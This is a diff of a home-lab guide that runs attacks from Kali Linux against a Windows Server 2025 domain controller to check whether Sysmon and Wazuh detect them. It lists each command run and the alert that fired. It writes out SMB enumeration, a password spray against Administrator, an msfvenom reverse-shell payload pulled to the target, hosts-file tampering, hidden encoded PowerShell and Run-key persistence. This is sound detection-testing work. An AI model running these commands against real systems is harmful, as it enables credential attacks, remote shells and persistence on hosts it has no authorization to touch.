@@ -1,107 +1,98 @@
 # Guide 04: Offensive Testing & Detection Validation (Kali Linux -> Win-DC01)
 
-## 🎯 Objective
-Simulate realistic adversary behaviors from **Kali Linux** against **`Win-DC01`** to test, trigger, and validate the **Sysmon** and **Wazuh FIM (`syscheck`)** detection rules configured in previous guides.
+**Date:** November 20, 2026  
+**Attacker Machine:** Kali Linux (`192.168.56.101`)  
+**Target Machine:** `Win-DC01` / `DC-COMPANY` (`Company.local` – `192.168.56.10`)  
+**SIEM Platform:** Wazuh (with Sysmon & Real-Time FIM `syscheck`)
 
 ---
 
-## 🛠️ Phase 1: Reconnaissance & Network Enumeration
-**Goal:** Discover open ports, SMB shares, and Active Directory services on `Win-DC01`, generating network connection telemetry.
+## 🎯 Objective
+Simulate realistic adversary behaviors across multiple MITRE ATT&CK tactics from **Kali Linux** against **`Win-DC01`** to test, trigger, and validate **Sysmon**, **Windows Security Auditing**, and **Wazuh FIM (`syscheck`)** detection rules.
 
-1. **Service & Version Scan (`Nmap`):**
-   ```bash
-   nmap -sC -sV -p 53,88,135,139,389,445,3389 <Win-DC01_IP> -oN nmap_dc01.txt
-   ```
-#### Phase 1 Findings – Exposed Services (`Win-DC01` / `192.168.56.10`)
+---
 
-| Port | Service | Security Relevance (Red vs. Blue Team) |
-| :--- | :--- | :--- |
-| **53/tcp** | DNS | Active Directory domain resolution; potential target for DNS enumeration/zone transfers. |
-| **88/tcp** | Kerberos | Core AD authentication; primary target for AS-REP Roasting and Kerberoasting. |
-| **135/tcp** | MSRPC | Remote procedure calls; used for lateral movement and WMI/DCOM enumeration. |
-| **139/445** | SMB | File sharing & AD SYSVOL/NETLOGON; prime target for null sessions, password spraying, and payload drops. |
-| **389/tcp** | LDAP | Active Directory directory queries; exposes user, group, and OU structure if unauthenticated binds are allowed. |
-| **3389/tcp** | RDP | Remote Desktop access; high-value target for credential brute-forcing. |
+## 🛠️ Phase 1: Reconnaissance & SMB Enumeration (MITRE T1046 / T1135)
 
-2. **SMB & Null Session Enumeration (`CrackMapExec` / `NetExec` & `enum4linux`):**
-   ```bash
-   netexec smb <Win-DC01_IP> -u '' -p '' --shares
-   enum4linux -a <Win-DC01_IP>
-   ```
-#### Phase 1 Results & Detection Analysis (`DC-COMPANY` / `192.168.56.10`)
-
-**Command Executed:**
+**Commands Executed (Kali):**
 ```bash
+nmap -sC -sV -p 53,88,135,139,389,445,3389 192.168.56.10 -oN nmap_dc01.txt
 netexec smb 192.168.56.10 -u '' -p '' --shares
 ```
-**Reconnaissance Findings:**
+
+**Findings & Defensive Controls Verified:**
 * **Target Identification:** Enumerated hostname **`DC-COMPANY`**, Active Directory domain **`Company.local`**, and OS **Windows Server 2025 (Build 26100)**.
-* **Defensive Controls Verified:**
+* **Hardening Controls Verified:**
   * **SMB Signing Enforced (`signing:True`):** Mitigates SMB NTLM relay attacks.
-  * **SMBv1 Disabled (`SMBv1:None`):** Protects against legacy SMB exploits (e.g., EternalBlue).
-  * **Share Enumeration Blocked (`STATUS_ACCESS_DENIED`):** Prevents unauthenticated users from listing sensitive SMB shares (`SYSVOL`, `NETLOGON`, etc.).
-* **Security Observation (`Null Auth:True`):** Although share listing was denied, SMB null session authentication succeeded (`[+] Company.local\:`), indicating anonymous RPC/SAMR queries could still be attempted unless explicitly restricted via Group Policy.
+  * **SMBv1 Disabled (`SMBv1:None`):** Protects against legacy SMB exploits.
+  * **Share Enumeration Blocked (`STATUS_ACCESS_DENIED`):** Prevents unauthenticated users from listing domain shares (`SYSVOL`, `NETLOGON`).
+* **Security Observation (`Null Auth:True`):** SMB null session authentication succeeded (`[+] Company.local\:`) at the protocol level, generating an `ANONYMOUS LOGON` (`Logon Type 3`) network event.
 
-**Wazuh SIEM Telemetry:**
-* Verified inbound SMB connection telemetry on port `445` originating from Kali (`192.168.56.101`) and observed anonymous network logon (`ANONYMOUS LOGON` / Logon Type 3) activity on `DC-COMPANY`.
-
-3. **Wazuh Verification:**
-   * Check Wazuh **Security Events** for **Sysmon Event ID 3 (Network Connection)** and Windows Security logs showing anonymous logon/enumeration attempts.
+![Phase 1 NetExec SMB Recon](images/04-phase1-netexec-recon.png)
 
 ---
 
-## 🔐 Phase 2: Credential Access (Brute-Force & Password Spraying)
-**Goal:** Simulate password attacks against SMB/RDP to trigger Windows failed logon alerts and Wazuh brute-force correlation rules.
+## 🔐 Phase 2: Controlled SMB Password Spraying (MITRE T1110.003)
 
-1. **Create a Small Target Wordlist (Kali):**
-   ```bash
-   echo -e "Password123!\nWelcome2026!\nWinter2026!\nAdmin1234" > passwords.txt
-   ```
-2. **Run a Controlled Password Spray (`NetExec` / `Hydra`):**
-   ```bash
-   netexec smb <Win-DC01_IP> -u Administrator -p passwords.txt --continue-on-success
-   ```
-3. **Wazuh Verification:**
-   * Look for **Windows Event ID 4625** (An account failed to log on) and Wazuh **Rule 60122 / 60204** (Multiple Windows logon failures / Brute force).
+**Commands Executed (Kali):**
+```bash
+printf 'Password123!\nWelcome2026!\nWinter2026!\nAdmin1234\n' > passwords.txt
+for p in \$(cat passwords.txt); do smbclient -L //192.168.56.10 -U "Company.local\\Administrator%\$p"; done
+```
+
+**Troubleshooting & Protocol Note:**
+* Initial spray attempts with `netexec` and `hydra` (`smb://`) encountered timeouts/protocol errors due to **Windows Server 2025's** hardened SMBv3 + NTLMv2 enforcement.
+* Pivoted to `smbclient`, which natively negotiates SMBv3 + NTLMv2, executing 4 controlled login attempts (`NT_STATUS_LOGON_FAILURE`) without triggering the domain account lockout threshold.
+
+**Wazuh SIEM Detection Verified:**
+* **Wazuh Rule `60122` (Level 5):** *Logon Failure - Unknown user or bad password* (4 consecutive alerts logged between `23:06:32` and `23:06:38`, capturing Windows **Event ID 4625**, `Logon Type 3`, and attacker IP `192.168.56.101`).
+
+![Phase 2 Wazuh Rule 60122 Failed Logons](images/04-phase2-wazuh-60122.png)
+---
+
+## 📂 Phase 3: Payload Drop & File Integrity Monitoring (MITRE T1105 / T1565)
+
+**Commands Executed:**
+```bash
+# Kali: Generate test payload & host via HTTP
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o update_patch.exe
+python3 -m http.server 8000
+```
+```powershell
+# Win-DC01: Pull payload & tamper with hosts file
+Invoke-WebRequest -Uri "http://192.168.56" -OutFile "C:\Users\Public\update_patch.exe" -UseBasicParsing
+Copy-Item C:\Windows\System32\whoami.exe C:\Users\Public\test_drop.exe
+Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`n192.168.56.101 internal-portal.company.local"
+```
+
+**Wazuh SIEM & Endpoint Detection Verified:**
+* **Endpoint Prevention:** Windows Defender immediately detected and quarantined `update_patch.exe` upon download.
+* **Wazuh Rule `92207` (Level 12):** *Executable file dropped in Users\Public folder* (`Sysmon Event ID 11`).
+* **Wazuh Rule `92213` (Level 15):** *Executable file dropped in folder commonly used by malware* (Critical-severity Sysmon detection).
+* **Tuning Observation:** Identified `Rule 61640` (*Sysmon - Suspicious Process - explorer.exe*, Level 12) firing on benign Explorer activity—flagged as a candidate for allowlist tuning.
+
+![Phase 3 Wazuh Sysmon Payload Drop Alerts](images/04-phase3-wazuh-92207-92213.png)
+---
+
+## ⚙️ Phase 4: Encoded PowerShell Execution & Registry Persistence (MITRE T1059.001 / T1547.001)
+
+**Commands Executed (`Win-DC01`):**
+```powershell
+powershell.exe -NoP -NonI -W Hidden -Enc dwBoAG8AYQBtAGkA
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterService" /t REG_SZ /d "C:\Users\Public\test_drop.exe" /f
+```
+
+**Wazuh SIEM Detection Verified:**
+* **Wazuh Rule `92066` (Level 4):** *`whoami.exe` binary in a suspicious location launched by `powershell.exe`* (`Sysmon Event ID 1` process creation tracking parent-child execution from Base64-encoded PowerShell).
+* **Registry Persistence Monitoring:** Verified `HKCU\...\Run` modification telemetry and restored all modified files/registry keys during post-test cleanup.
+
+![Phase 4 Wazuh Sysmon PowerShell Execution Alert](images/04-phase4-wazuh-92066.png)
+
 
 ---
 
-## 📂 Phase 3: Payload Drop & File Integrity Monitoring (FIM) Validation
-**Goal:** Simulate an attacker dropping a malicious binary/script and tampering with the `hosts` file to trigger Wazuh `syscheck` alerts.
+## 📝 Key Lessons Learned
+1. **Defense-in-Depth Validation:** Testing against Windows Server 2025 demonstrated how enforced SMBv3/NTLMv2 signing blocks legacy attack tools, while Windows Defender + Sysmon + Wazuh FIM provide layered prevention and detection.
+2. **High-Fidelity Sysmon Detections:** Sysmon Event IDs `1` and `11` mapped directly to high-severity Wazuh rules (`92207`, `92213`, `92066`), catching payload drops in `C:\Users\Public\` and encoded PowerShell child processes immediately.
+3. **Ongoing False-Positive Tuning:** Observing benign triggers like `Rule 61640` (`explorer.exe`) reinforced that SIEM tuning is continuous—even after initial baseline filtering.
 
-1. **Generate a Benign Test Payload (`msfvenom`):**
-   ```bash
-   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o update_patch.exe
-   ```
-2. **Transfer/Drop File onto `Win-DC01` (via SMB share or simulated download):**
-   * Place `update_patch.exe` into a monitored directory (e.g., `C:\Users\Public\` or `C:\Temp\`).
-   * Append a test entry to `C:\Windows\System32\drivers\etc\hosts` (e.g., `10.10.10.99 internal-portal.local`).
-3. **Wazuh Verification:**
-   * Open Wazuh **Integrity Monitoring (FIM)** and confirm real-time alerts for **File added** (`update_patch.exe`) and **File modified** (`hosts`).
-
----
-
-## ⚙️ Phase 4: Execution & Registry Persistence Validation
-**Goal:** Execute suspicious LOLBins (Living Off the Land Binaries) and add a Run key to validate **Sysmon Event ID 1** and **Sysmon Event ID 13 / FIM Registry** alerts.
-
-1. **Trigger Suspicious Process Creation (`Win-DC01` or via reverse shell):**
-   * Run an encoded PowerShell test command (benign `whoami` / `hostname`):
-     ```powershell
-     powershell.exe -NoP -NonI -W Hidden -Enc dwBoAG8AYQBtAGkA
-     ```
-2. **Simulate Registry Run Key Persistence:**
-   ```powershell
-   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterService" /t REG_SZ /d "C:\Users\Public\update_patch.exe" /f
-   ```
-3. **Wazuh Verification:**
-   * Verify **Sysmon Event ID 1** (Process creation capturing encoded PowerShell arguments).
-   * Verify **Sysmon Event ID 13** / **Wazuh FIM Registry** alert for `HKCU\...\Run` modification.
-
----
-
-## 📸 Documentation Checklist (For GitHub Portfolio)
-* [ ] Screenshot of `nmap` / `netexec` output on Kali.
-* [ ] Screenshot of Wazuh alert for SMB brute-force (`Event ID 4625`).
-* [ ] Screenshot of Wazuh FIM alert for `update_patch.exe` drop and `hosts` modification.
-* [ ] Screenshot of Sysmon Process Creation (`Event ID 1`) & Registry Persistence (`Event ID 13`).
-* [ ] Clean up test artifacts (`update_patch.exe`, `hosts` entry, and `UpdaterService` registry key) on `Win-DC01`.
